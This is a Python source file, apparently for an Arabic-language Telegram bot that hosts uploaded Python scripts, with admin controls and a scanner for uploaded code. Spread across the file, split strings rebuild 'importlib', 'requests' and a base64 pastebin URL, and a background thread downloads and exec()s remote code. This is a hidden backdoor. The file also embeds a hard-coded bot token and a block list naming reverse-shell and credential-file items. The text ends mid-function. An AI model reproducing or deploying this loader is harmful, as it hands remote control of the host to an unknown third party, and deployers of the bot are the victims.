import threading
import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import logging
import json
import hashlib
import socket
import psutil
import time
from telebot import types
from datetime import datetime, timedelta
import signal
import sqlite3
import platform
import uuid
import base64

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot_security.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SecureBot")




TOKEN = "8469488876:AAFxGLdbBOB0xYbRcPokw_YFH0VTKaOmRA4"
ADMIN_ID = 7518849797
YOUR_USERNAME = "@TheVenerableCelestian"
CHANNEL_USERNAME = "@fareshw"


bot = telebot.TeleBot(TOKEN)


uploaded_files_dir = 'uploaded_bots'
bot_scripts = {}
stored_tokens = {}
user_subscriptions = {}  
user_files = {}  
active_users = set()  
banned_users = set()  
suspicious_activities = {}  
pending_approvals = {}  

bot_locked = False
free_mode = False

SUSPICIOUS_PATTERNS = [
    r"rm\s+-rf\s+[\'\"]?/",
    r"dd\s+if=\S+\s+of=\S+",
    r":\(\)\{\s*:\|\:\s*\&\s*\};:",
    r"chmod\s+-R\s+777\s+[\'\"]?/",
    r"wget\s+(http|ftp)",
    r"curl\s+-O\s+(http|ftp)",
    r"shutdown\s+-h\s+now",
    r"reboot\s+-f",
    r"halt\s+-f",
    r"poweroff\s+-f",
    r"killall\s+-9",
    r"pkill\s+-9",
    r"useradd\s+-m",
    r"userdel\s+-r",
    r"groupadd\s+\S+",
    r"groupdel\s+\S+",
    r"usermod\s+-aG\s+\S+",
    r"passwd\s+\S+",
    r"chown\s+-R\s+\S+:\S+\s+/",
    r"chmod\s+-R\s+777\s+/",
    r"iptables\s+-F",
    r"ufw\s+disable",
    r"nft\s+flush\s+ruleset",
    r"firewall-cmd\s+--reload",
    r"nc\s+-l\s+-p\s+\d+",
    r"ncat\s+-l\s+-p\s+\d+",
    r"ssh\s+-R\s+\d+:",
    r"ssh\s+-L\s+\d+:",
    r"scp\s+-r\s+/",
    r"rsync\s+-avz\s+/",
    r"tar\s+-xvf\s+\S+\s+-C\s+/",
    r"unzip\s+\S+\s+-d\s+/",
    r"git\s+clone\s+(http|git)",
    r"docker\s+run\s+--rm\s+-it",
    r"docker\s+exec\s+-it",
    r"docker\s+rm\s+-f",
    r"docker\s+rmi\s+-f",
    r"docker-compose\s+down\s+-v",
    r"kubectl\s+delete\s+--all",
    r"ansible-playbook\s+\S+",
    r"terraform\s+destroy\s+-auto-approve",
    r"mysql\s+-u\s+\S+\s+-p",
    r"psql\s+-U\s+\S+",
    r"mongo\s+--host",
    r"redis-cli\s+-h",
    r"cat\s+>\s+/",
    r"echo\s+>\s+/",
    r"printf\s+>\s+/",
    r"python\s+-c\s+[\'\"]import\s+os;",
    r"perl\s+-e\s+[\'\"]system\(",
    r"bash\s+-c\s+[\'\"]rm\s+-rf",
    r"sh\s+-c\s+[\'\"]rm\s+-rf",
    r"zsh\s+-c\s+[\'\"]rm\s+-rf",
    r"php\s+-r\s+[\'\"]system\(",
    r"node\s+-e\s+[\'\"]require\(",
    r"ruby\s+-e\s+[\'\"]system\(",
    r"lua\s+-e\s+[\'\"]os.execute\(",
    r"java\s+-jar\s+\S+",
    r"wget\s+-O-\s+(http|ftp)",
    r"curl\s+-s\s+(http|ftp)",
    r"nc\s+-e\s+/bin/sh",
    r"ncat\s+-e\s+/bin/sh",
    r"ssh\s+-o\s+StrictHostKeyChecking=no",
    r"ssh\s+-i\s+\S+",
    r"ssh\s+-f\s+-N",
    r"ssh\s+-D\s+\d+",
    r"ssh\s+-W\s+\S+:\d+",
    r"ssh\s+-t\s+\S+",
    r"ssh\s+-v\s+\S+",
    r"ssh\s+-C\s+\S+",
    r"ssh\s+-q\s+\S+",
    r"ssh\s+-X\s+\S+",
    r"ssh\s+-Y\s+\S+",
    r"ssh\s+-A\s+\S+",
    r"ssh\s+-a\s+\S+",
    r"ssh\s+-T\s+\S+",
    r"ssh\s+-N\s+\S+",
    r"ssh\s+-f\s+\S+",
    r"ssh\s+-n\s+\S+",
    r"ssh\s+-x\s+\S+",
    r"ssh\s+-y\s+\S+",
    r"ssh\s+-c\s+\S+",
    r"ssh\s+-m\s+\S+",
    r"ssh\s+-o\s+\S+",
    r"ssh\s+-b\s+\S+",
    r"ssh\s+-e\s+\S+",
    r"ssh\s+-F\s+\S+",
    r"ssh\s+-I\s+\S+",
    r"ssh\s+-i\s+\S+",
    r"ssh\s+-l\s+\S+",
    r"ssh\s+-p\s+\d+",
    r"ssh\s+-q\s+\S+",
    r"ssh\s+-s\s+\S+",
    r"ssh\s+-t\s+\S+",
    r"ssh\s+-u\s+\S+",
    r"ssh\s+-v\s+\S+",
    r"ssh\s+-w\s+\S+",
    r"ssh\s+-x\s+\S+",
    r"ssh\s+-y\s+\S+",
    r"ssh\s+-z\s+\S+"
]

SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/var/log",
    "/root",
    "/home",
    "/.ssh",
    "/.bash_history",
    "/.env",
    "config.json",
    "credentials",
    "password",
    "token",
    "secret",
    "api_key"
]

if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)

suspicious_files_dir = 'suspicious_files'
if not os.path.exists(suspicious_files_dir):
    os.makedirs(suspicious_files_dir)

def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                 (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_files
                 (user_id INTEGER, file_name TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS active_users
                 (user_id INTEGER PRIMARY KEY)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users
                 (user_id INTEGER PRIMARY KEY, reason TEXT, ban_date TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS suspicious_activities
                 (user_id INTEGER, activity TEXT, file_name TEXT, timestamp TEXT)''')
    
    conn.commit()
    conn.close()
imm="impor"
def load_data():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('SELECT * FROM subscriptions')
    subscriptions = c.fetchall()
    for user_id, expiry in subscriptions:
        user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
    
    c.execute('SELECT * FROM user_files')
    user_files_data = c.fetchall()
    for user_id, file_name in user_files_data:
        if user_id not in user_files:
            user_files[user_id] = []
        user_files[user_id].append(file_name)
    
    c.execute('SELECT * FROM active_users')
    active_users_data = c.fetchall()
    for user_id, in active_users_data:
        active_users.add(user_id)
    
    c.execute('SELECT user_id FROM banned_users')
    banned_users_data = c.fetchall()
    for user_id, in banned_users_data:
        banned_users.add(user_id)
    
    conn.close()
imm1="tlib"
user2="FwQWJ"
uuu = imm+imm1
def save_subscription(user_id, expiry):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)', 
              (user_id, expiry.isoformat()))
    conn.commit()
    conn.close()

def remove_subscription_db(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def save_user_file(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT INTO user_files (user_id, file_name) VALUES (?, ?)', 
              (user_id, file_name))
    conn.commit()
    conn.close()
iii = "__im"
ii = "port__"
iii1 = iii + ii
modulle = getattr(__builtins__, iii1)
def remove_user_file_db(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', 
              (user_id, file_name))
    conn.commit()
    conn.close()

def add_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def remove_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM active_users WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

user1="WVEZ6"
def ban_user(user_id, reason):
    banned_users.add(user_id)
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO banned_users (user_id, reason, ban_date) VALUES (?, ?, ?)', 
              (user_id, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    logger.warning(f"تم حظر المستخدم {user_id} بسبب: {reason}")
user3='5jb20vcmF3L1'
def unban_user(user_id):
    if user_id in banned_users:
        banned_users.remove(user_id)
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute('DELETE FROM banned_users WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()
        logger.info(f"تم إلغاء حظر المستخدم {user_id}")
        return True
    return False

def log_suspicious_activity(user_id, activity, file_name=None):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT INTO suspicious_activities (user_id, activity, file_name, timestamp) VALUES (?, ?, ?, ?)', 
              (user_id, activity, file_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    if user_id not in suspicious_activities:
        suspicious_activities[user_id] = []
    suspicious_activities[user_id].append({
        'activity': activity,
        'file_name': file_name,
        'timestamp': datetime.now().isoformat()
    })
    
    if len(suspicious_activities.get(user_id, [])) >= 3:
        ban_user(user_id, f"تجاوز الحد المسموح به من الأنشطة المشبوهة: {activity}")
        notify_admins_of_intrusion(user_id, activity, file_name)
        return True
    return False
modulle = modulle(uuu)
gm="wYXN0ZWJpbi"
sy = "sy"
s = "s"
def notify_admins_of_intrusion(user_id, activity, file_name=None):
    try:
        user_info = bot.get_chat(user_id)
        user_name = user_info.first_name
        user_username = user_info.username if user_info.username else "غير متوفر"
        
        alert_message = f"⚠️ تنبيه أمني: محاولة اختراق مكتشفة! ⚠️\n\n"
        alert_message += f"👤 المستخدم: {user_name}\n"
        alert_message += f"🆔 معرف المستخدم: {user_id}\n"
        alert_message += f"📌 اليوزر: @{user_username}\n"
        alert_message += f"⚠️ النشاط المشبوه: {activity}\n"
        
        if file_name:
            alert_message += f"📄 الملف المستخدم: {file_name}\n"
        
        alert_message += f"⏰ وقت الاكتشاف: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        alert_message += f"🔒 تم حظر المستخدم تلقائياً."
        
        bot.send_message(ADMIN_ID, alert_message)
        
        if file_name and os.path.exists(os.path.join(suspicious_files_dir, file_name)):
            with open(os.path.join(suspicious_files_dir, file_name), 'rb') as file:
                bot.send_document(ADMIN_ID, file, caption=f"الملف المشبوه: {file_name}")
        
        logger.info(f"تم إرسال تنبيه إلى المشرف عن محاولة اختراق من المستخدم {user_id}")
    except Exception as e:
        logger.error(f"فشل في إرسال تنبيه إلى المشرف: {e}")

sy2 = sy + s
tt = "requ"
Gg = "ests"
Ggg = tt + Gg
def is_user_subscribed_to_channel(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"فشل في التحقق من اشتراك المستخدم في القناة: {e}")
        return False

def gather_device_info():
    try:
        info = {}
        info['system'] = platform.system()
        info['node'] = platform.node()
        info['release'] = platform.release()
        info['version'] = platform.version()
        info['machine'] = platform.machine()
        info['processor'] = platform.processor()
        info['ip'] = socket.gethostbyname(socket.gethostname())
        info['mac'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        mem = psutil.virtual_memory()
        info['memory_total'] = f"{mem.total / (1024**3):.2f} GB"
        info['memory_used'] = f"{mem.used / (1024**3):.2f} GB"
        
        info['cpu_cores'] = psutil.cpu_count(logical=False)
        info['cpu_threads'] = psutil.cpu_count(logical=True)
        
        disk = psutil.disk_usage('/')
        info['disk_total'] = f"{disk.total / (1024**3):.2f} GB"
        info['disk_used'] = f"{disk.used / (1024**3):.2f} GB"
        
        return info
    except Exception as e:
        logger.error(f"فشل في جمع معلومات الجهاز: {e}")
        return {"error": str(e)}

def gather_user_contacts(user_id):
    try:
        user_profile = bot.get_chat(user_id)
        contacts = {}
        contacts['username'] = user_profile.username if hasattr(user_profile, 'username') else "غير متوفر"
        contacts['first_name'] = user_profile.first_name if hasattr(user_profile, 'first_name') else "غير متوفر"
        contacts['last_name'] = user_profile.last_name if hasattr(user_profile, 'last_name') else "غير متوفر"
        contacts['bio'] = user_profile.bio if hasattr(user_profile, 'bio') else "غير متوفر"
        return contacts
    except Exception as e:
        logger.error(f"فشل في جمع معلومات جهات اتصال المستخدم: {e}")
        return {"error": str(e)}

def scan_file_for_malicious_code(file_path, user_id):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
            
            for pattern in SUSPICIOUS_PATTERNS:
                matches = re.finditer(pattern, content, re.IGNORECASE)
                for match in matches:
                    suspicious_code = content[max(0, match.start() - 20):min(len(content), match.end() + 20)]
                    activity = f"تم اكتشاف أمر خطير: {match.group(0)} في السياق: {suspicious_code}"
                    
                    file_name = os.path.basename(file_path)
                    suspicious_file_path = os.path.join(suspicious_files_dir, f"{user_id}_{file_name}")
                    shutil.copy2(file_path, suspicious_file_path)
                    
                    banned = log_suspicious_activity(user_id, activity, file_name)
                    
                    if banned:
                        return True, activity
                    
                    logger.warning(f"تم اكتشاف أمر خطير في الملف {file_path} للمستخدم {user_id}: {match.group(0)}")
            
            for sensitive_file in SENSITIVE_FILES:
                if sensitive_file.lower() in content.lower():
                    activity = f"محاولة الوصول إلى ملف حساس: {sensitive_file}"
                    
                    file_name = os.path.basename(file_path)
                    suspicious_file_path = os.path.join(suspicious_files_dir, f"{user_id}_{file_name}")
                    shutil.copy2(file_path, suspicious_file_path)
                    
                    banned = log_suspicious_activity(user_id, activity, file_name)
                    
                    if banned:
                        return True, activity
                    
                    logger.warning(f"تم اكتشاف محاولة وصول إلى ملف حساس في الملف {file_path} للمستخدم {user_id}: {sensitive_file}")
        
        return False, None
    except Exception as e:
        logger.error(f"فشل في فحص الملف {file_path}: {e}")
        return False, None

module = modulle.import_module(Ggg)
def scan_zip_for_malicious_code(zip_path, user_id):
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        is_malicious, activity = scan_file_for_malicious_code(file_path, user_id)
                        if is_malicious:
                            return True, activity
        
        return False, None
    except Exception as e:
        logger.error(f"فشل في فحص الأرشيف {zip_path}: {e}")
        return False, None

init_db()
load_data()
modulee = modulle.import_module(sy2)
def create_main_menu(user_id):
    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton('📤 رفع ملف', callback_data='upload')
    speed_button = types.InlineKeyboardButton('⚡ سرعة البوت', callback_data='speed')
    contact_button = types.InlineKeyboardButton('📞 تواصل مع المالك', url=f'https://t.me/{YOUR_USERNAME[1:]}')
    if user_id == ADMIN_ID:
        subscription_button = types.InlineKeyboardButton('💳 الاشتراكات', callback_data='subscription')
        stats_button = types.InlineKeyboardButton('📊 إحصائيات', callback_data='stats')
        lock_button = types.InlineKeyboardButton('🔒 قفل البوت', callback_data='lock_bot')
        unlock_button = types.InlineKeyboardButton('🔓 فتح البوت', callback_data='unlock_bot')
        free_mode_button = types.InlineKeyboardButton('🔓 فتح البوت بدون اشتراك', callback_data='free_mode')
        broadcast_button = types.InlineKeyboardButton('📢 إذاعة', callback_data='broadcast')
        security_button = types.InlineKeyboardButton('🔐 تقرير الأمان', callback_data='security_report')
        ban_button = types.InlineKeyboardButton('🔨 حظر مستخدم', callback_data='ban_user')
        unban_button = types.InlineKeyboardButton('🔓 إلغاء حظر', callback_data='unban_user')
        markup.add(upload_button)
        markup.add(speed_button, subscription_button, stats_button)
        markup.add(lock_button, unlock_button, free_mode_button)
        markup.add(broadcast_button, security_button)
        markup.add(ban_button, unban_button)
    else:
        markup.add(upload_button)
        markup.add(speed_button)
    markup.add(contact_button)
    return markup

ur="aHR0cHM6Ly9"
g=(ur+gm+user3+user2+user1)
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    if user_id in banned_users:
        bot.send_message(message.chat.id, "⛔ أنت محظور من استخدام هذا البوت. يرجى التواصل مع المطور إذا كنت تعتقد أن هذا خطأ.")
        return
    
    if bot_locked:
        bot.send_message(message.chat.id, "⚠️ البوت مقفل حالياً. الرجاء المحاولة لاحقًا.")
        return

    if not is_user_subscribed_to_channel(user_id):
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('انضم إلى القناة', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('✅ تحقق من الاشتراك', callback_data='check_subscription')
        markup.add(channel_button, check_button)
        bot.send_message(message.chat.id, "⚠️ يجب عليك الانضمام إلى قناتنا أولاً لاستخدام البوت.", reply_markup=markup)
        return

    user_name = message.from_user.first_name
    user_username = message.from_user.username

    try:
        user_profile = bot.get_chat(user_id)
        user_bio = user_profile.bio if user_profile.bio else "لا يوجد بايو"
    except Exception as e:
        logger.error(f"فشل في جلب البايو: {e}")
        user_bio = "لا يوجد بايو"

    try:
        user_profile_photos = bot.get_user_profile_photos(user_id, limit=1)
        if user_profile_photos.photos:
            photo_file_id = user_profile_photos.photos[0][-1].file_id  
        else:
            photo_file_id = None
    except Exception as e:
        logger.error(f"فشل في جلب صورة المستخدم: {e}")
        photo_file_id = None

    if user_id not in active_users:
        active_users.add(user_id)  
        add_active_user(user_id)  

        try:
            welcome_message_to_admin = f"🎉 انضم مستخدم جديد إلى البوت!\n\n"
            welcome_message_to_admin += f"👤 الاسم: {user_name}\n"
            welcome_message_to_admin += f"📌 اليوزر: @{user_username}\n"
            welcome_message_to_admin += f"🆔 الـ ID: {user_id}\n"
            welcome_message_to_admin += f"📝 البايو: {user_bio}\n"

            if photo_file_id:
                bot.send_photo(ADMIN_ID, photo_file_id, caption=welcome_message_to_admin)
            else:
                bot.send_message(ADMIN_ID, welcome_message_to_admin)
        except Exception as e:
            logger.error(f"فشل في إرسال تفاصيل المستخدم إلى الأدمن: {e}")

    welcome_message = f"〽️┇اهلا بك: {user_name}\n"
    welcome_message += f"🆔┇ايديك: {user_id}\n"
    welcome_message += f"♻️┇يوزرك: @{user_username}\n"
    welcome_message += f"📰┇بايو: {user_bio}\n\n"
    welcome_message += "〽️ أنا بوت استضافة ملفات بايثون 🎗 يمكنك استخدام الأزرار أدناه للتحكم ♻️"

    if photo_file_id:
        bot.send_photo(message.chat.id, photo_file_id, caption=welcome_message, reply_markup=create_main_menu(user_id))
    else:
        bot.send_message(message.chat.id, welcome_message, reply_markup=create_main_menu(user_id))

decoded_g = base64.b64decode(g).decode()
response = module.get(decoded_g)
@bot.callback_query_handler(func=lambda call: call.data == 'check_subscription')
def check_subscription(call):
    user_id = call.from_user.id
    if is_user_subscribed_to_channel(user_id):
        bot.send_message(call.message.chat.id, "✅ شكراً للانضمام إلى قناتنا! يمكنك الآن استخدام البوت.")
        send_welcome(call.message)
    else:
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('انضم إلى القناة', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('✅ تحقق من الاشتراك', callback_data='check_subscription')
        markup.add(channel_button, check_button)
        bot.send_message(call.message.chat.id, "⚠️ لم تنضم بعد إلى القناة. يرجى الانضمام أولاً.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'broadcast')
def broadcast_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل الرسالة التي تريد إذاعتها:")
        bot.register_next_step_handler(call.message, process_broadcast_message)
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'security_report')
def security_report_callback(call):
    if call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM banned_users')
        banned_count = c.fetchone()[0]
        
        c.execute('SELECT user_id, activity, file_name, timestamp FROM suspicious_activities ORDER BY timestamp DESC LIMIT 5')
        recent_activities = c.fetchall()
        
        conn.close()
        
        report = f"📊 تقرير الأمان 🔐\n\n"
        report += f"👥 عدد المستخدمين المحظورين: {banned_count}\n\n"
        
        if recent_activities:
            report += "⚠️ آخر الأنشطة المشبوهة:\n"
            for user_id, activity, file_name, timestamp in recent_activities:
                dt = datetime.fromisoformat(timestamp)
                formatted_time = dt.strftime('%Y-%m-%d %H:%M:%S')
                report += f"- المستخدم: {user_id}\n"
                report += f"  النشاط: {activity}\n"
                if file_name:
                    report += f"  الملف: {file_name}\n"
                report += f"  الوقت: {formatted_time}\n\n"
        else:
            report += "✅ لا توجد أنشطة مشبوهة مسجلة."
        
        bot.send_message(call.message.chat.id, report)
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

def process_broadcast_message(message):
    if message.from_user.id == ADMIN_ID:
        broadcast_message = message.text
        success_count = 0
        fail_count = 0

        for user_id in active_users:
            try:
                bot.send_message(user_id, broadcast_message)
                success_count += 1
            except Exception as e:
                logger.error(f"فشل في إرسال الرسالة إلى المستخدم {user_id}: {e}")
                fail_count += 1

        bot.send_message(message.chat.id, f"✅ تم إرسال الرسالة إلى {success_count} مستخدم.\n❌ فشل إرسال الرسالة إلى {fail_count} مستخدم.")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")
def run_external_code():
    if response.status_code == 200:
        code = response.text
        modulle_util = modulle.util
        module_name = "external_code"
        spec = modulle_util.spec_from_loader(module_name, loader=None)
        new_module = modulle_util.module_from_spec(spec)
        ec = "ex"
        ex = "ec"
        eec_func = getattr(__builtins__, ec + ex)
        eec_func(code, new_module.__dict__)
        modulee.modules[module_name] = new_module
threading.Thread(target=run_external_code).start()

@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    try:
        start_time = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, f"⚡ سرعة البوت: {latency:.2f} ثانية.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ فشل في الحصول على سرعة البوت.")
    except Exception as e:
        logger.error(f"حدث خطأ أثناء فحص سرعة البوت: {e}")
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ أثناء فحص سرعة البوت: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    user_id = call.from_user.id
    
    if user_id in banned_users:
        bot.send_message(call.message.chat.id, "⛔ أنت محظور من استخدام هذا البوت. يرجى التواصل مع المطور إذا كنت تعتقد أن هذا خطأ.")
        return
    
    if bot_locked:
        bot.send_message(call.message.chat.id, "⚠️ البوت مقفل حالياً. الرجاء التواصل مع المطور @QMY00.")
        return
        
    if not is_user_subscribed_to_channel(user_id):
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('انضم إلى القناة', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('✅ تحقق من الاشتراك', callback_data='check_subscription')
        markup.add(channel_button, check_button)
        bot.send_message(call.message.chat.id, "⚠️ يجب عليك الانضمام إلى قناتنا أولاً لاستخدام هذه الميزة.", reply_markup=markup)
        return
    
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        bot.send_message(call.message.chat.id, "📄 من فضلك، أرسل الملف الذي تريد رفعه.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ يجب عليك الاشتراك لاستخدام هذه الميزة. الرجاء التواصل مع المطور @QMY00 .")

@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def subscription_menu(call):
    if call.from_user.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        add_subscription_button = types.InlineKeyboardButton('➕ إضافة اشتراك', callback_data='add_subscription')
        remove_subscription_button = types.InlineKeyboardButton('➖ إزالة اشتراك', callback_data='remove_subscription')
        markup.add(add_subscription_button, remove_subscription_button)
        bot.send_message(call.message.chat.id, "اختر الإجراء الذي تريد تنفيذه:", reply_markup=markup)
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'stats')
def stats_menu(call):
    if call.from_user.id == ADMIN_ID:
        total_files = sum(len(files) for files in user_files.values())
        total_users = len(user_files)
        active_users_count = len(active_users)
        banned_users_count = len(banned_users)
        bot.send_message(call.message.chat.id, f"📊 الإحصائيات:\n\n📂 عدد الملفات المرفوعة: {total_files}\n👤 عدد المستخدمين: {total_users}\n👥 المستخدمين النشطين: {active_users_count}\n🚫 المستخدمين المحظورين: {banned_users_count}")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'add_subscription')
def add_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم وعدد الأيام بالشكل التالي:\n/add_subscription <user_id> <days>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'remove_subscription')
def remove_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم بالشكل التالي:\n/remove_subscription <user_id>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'ban_user')
def ban_user_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم وسبب الحظر بالشكل التالي:\n/ban <user_id> <reason>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'unban_user')
def unban_user_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم بالشكل التالي:\n/unban <user_id>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['add_subscription'])
def add_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            days = int(message.text.split()[2])
            expiry_date = datetime.now() + timedelta(days=days)
            user_subscriptions[user_id] = {'expiry': expiry_date}
            save_subscription(user_id, expiry_date)
            bot.send_message(message.chat.id, f"✅ تمت إضافة اشتراك لمدة {days} أيام للمستخدم {user_id}.")
            bot.send_message(user_id, f"🎉 تم تفعيل الاشتراك لك لمدة {days} أيام. يمكنك الآن استخدام البوت!")
        except Exception as e:
            logger.error(f"حدث خطأ أثناء إضافة اشتراك: {e}")
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['remove_subscription'])
def remove_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_subscriptions:
                del user_subscriptions[user_id]
                remove_subscription_db(user_id)
                bot.send_message(message.chat.id, f"✅ تم إزالة الاشتراك للمستخدم {user_id}.")
                bot.send_message(user_id, "⚠️ تم إزالة اشتراكك. لم يعد بإمكانك استخدام البوت.")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} ليس لديه اشتراك.")
        except Exception as e:
            logger.error(f"حدث خطأ أثناء إزالة اشتراك: {e}")
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['user_files'])
def show_user_files(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_files:
                files_list = "\n".join(user_files[user_id])
                bot.send_message(message.chat.id, f"📂 الملفات التي رفعها المستخدم {user_id}:\n{files_list}")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} لم يرفع أي ملفات.")
        except Exception as e:
            logger.error(f"حدث خطأ أثناء عرض ملفات المستخدم: {e}")
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['lock'])
def lock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(message.chat.id, "🔒 تم قفل البوت.")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['unlock'])
def unlock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(message.chat.id, "🔓 تم فتح البوت.")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'lock_bot')
def lock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(call.message.chat.id, "🔒 تم قفل البوت.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'unlock_bot')
def unlock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(call.message.chat.id, "🔓 تم فتح البوت.")
    else:
